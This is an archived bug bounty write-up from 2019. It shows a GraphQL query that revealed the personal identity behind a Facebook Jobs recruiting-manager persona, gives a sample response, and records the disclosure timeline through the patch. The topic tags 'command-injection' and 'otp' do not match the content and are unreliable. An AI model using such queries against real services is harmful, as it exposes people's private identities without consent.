---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-11-19_disclose-the-owner-of-a-recruiting-manager-in-jobs-beta.md
original_filename: 2019-11-19_disclose-the-owner-of-a-recruiting-manager-in-jobs-beta.md
title: Disclose the owner of a recruiting manager in Jobs Beta
category: documents
detected_topics:
- command-injection
- otp
- graphql
- information-disclosure
tags:
- imported
- documents
- command-injection
- otp
- graphql
- information-disclosure
language: en
raw_sha256: 78c42749df700719cf83ca43ad584f94ed5968a000a41dd9c5c12f273c433da5
text_sha256: 7cc6c72c8b472a8032a397182ffc7f60305f199f09a745ecee52b4392294c99a
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Disclose the owner of a recruiting manager in Jobs Beta

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-11-19_disclose-the-owner-of-a-recruiting-manager-in-jobs-beta.md
- Source Type: markdown
- Detected Topics: command-injection, otp, graphql, information-disclosure
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `78c42749df700719cf83ca43ad584f94ed5968a000a41dd9c5c12f273c433da5`
- Text SHA256: `7cc6c72c8b472a8032a397182ffc7f60305f199f09a745ecee52b4392294c99a`


## Content

---
title: "Disclose the owner of a recruiting manager in Jobs Beta"
page_title: "Disclose the owner of a recruiting manager in Jobs Beta - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/disclose-the-owner-of-a-recruiting-manager-in-jobs-beta/"
final_url: "https://philippeharewood.com/disclose-the-owner-of-a-recruiting-manager-in-jobs-beta/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["Information disclosure"]
publication_date: "2019-11-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4932
---

Posted on [November 19, 2019](https://philippeharewood.com/disclose-the-owner-of-a-recruiting-manager-in-jobs-beta/)

# Disclose the owner of a recruiting manager in Jobs Beta

Facebook has a feature capable of posting jobs on behalf of personas called recruiting managers. It is possible to identify the creator of the persona.  
  
Any job opening with a “LISTED BY” section on the right under https://www.facebook.com/jobs/nearby/all/all/example

1\. Request the recruiting manager photo for a given job opening

https://graph.facebook.com/graphql?q=node(JOB_OPENING){recruiting_manager{photo{id,owner{name,id}}}}  
  
This will disclose the page owner personal identity
  
  
  {
  "JOBOPENINGID": {
  "recruiting_manager": {
  "photo": {
  "id": "PHOTO_ID",
  "owner": {"name": "Some User","id": "4"}
  }
  }
  }
  }

**Timeline**

Nov 19, 2019 – Report sent  
Nov 21, 2019 – Confirmation of submission by Facebook  
Dec 6, 2019– Confirmation of patch by Facebook  
Dec 12, 2019 – Bounty awarded by Facebook
